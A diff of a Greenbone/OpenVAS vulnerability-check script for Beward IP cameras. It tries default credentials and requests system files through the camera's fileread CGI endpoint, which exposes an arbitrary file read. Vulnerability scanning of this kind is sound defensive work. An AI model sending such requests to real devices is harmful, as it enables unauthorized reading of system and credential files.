@@ -19,10 +19,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.114073");
-  script_version("$Revision: 13887 $");
+  script_version("$Revision: 13906 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2019-02-26 15:32:13 +0100 (Tue, 26 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-27 13:16:09 +0100 (Wed, 27 Feb 2019) $");
   script_tag(name:"creation_date", value:"2019-02-18 14:02:55 +0100 (Mon, 18 Feb 2019)");
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
@@ -48,7 +48,7 @@ if(description)
 
   script_tag(name:"affected", value:"At least versions M2.1.6.04C014 and before.");
 
-  script_tag(name:"solution", value:"No known solution is available as of 26th February, 2019.
+  script_tag(name:"solution", value:"No known solution is available as of 27th February, 2019.
   Information regarding this issue will be updated once solution details are available.");
 
   script_tag(name:"solution_type", value:"NoneAvailable");
@@ -64,32 +64,39 @@ include("http_keepalive.inc");
 
 CPE = "cpe:/h:beward";
 
-if(!info = get_app_port_from_cpe_prefix(cpe: CPE, service: "www")) exit(0);
+if(!info = get_app_port_from_cpe_prefix(cpe: CPE, service: "www"))
+  exit(0);
 
 CPE = info["cpe"];
 port = info["port"];
 
-if(!get_app_location(cpe: CPE, port: port)) exit(0); # nb: Unused but added to have a reference to the Detection-NVT
+if(!get_app_location(cpe: CPE, port: port)) # nb: Unused but added to have a reference to the Detection-NVT
+  exit(0);
 
-creds = get_kb_item("beward/ip_camera/credentials");
+creds = get_kb_list("beward/ip_camera/credentials");
+if(!creds)
+  exit(0);
 
 files = traversal_files("linux");
 
-foreach pattern(keys(files)) {
+foreach cred(creds) {
 
-  file = files[pattern];
+  foreach pattern(keys(files)) {
 
-  url = "/cgi-bin/operator/fileread?READ.filePath=/" + file;
+    file = files[pattern];
 
-  req = http_get_req(port: port, url: url, add_headers: make_array("Accept-Encoding", "gzip, deflate",
-                                                                   "Authorization", "Basic " + base64(str: creds)));
+    url = "/cgi-bin/operator/fileread?READ.filePath=/" + file;
 
-  res = http_keepalive_send_recv(port: port, data: req);
+    req = http_get_req(port: port, url: url, add_headers: make_array("Accept-Encoding", "gzip, deflate",
+                                                                     "Authorization", "Basic " + base64(str: cred)));
+    res = http_keepalive_send_recv(port: port, data: req);
 
-  if(egrep(string:res, pattern:pattern)) {
-    report = "It was possible to successfully read a system file.";
-    security_message(port: port, data: report);
-    exit(0);
+    if(egrep(string:res, pattern:pattern)) {
+      report  = report_vuln_url(port: port, url: url);
+      report += '\nUsed default credentials for the login and the sent request: (username:password)\n' + cred;
+      security_message(port: port, data: report);
+      exit(0);
+    }
   }
 }
 
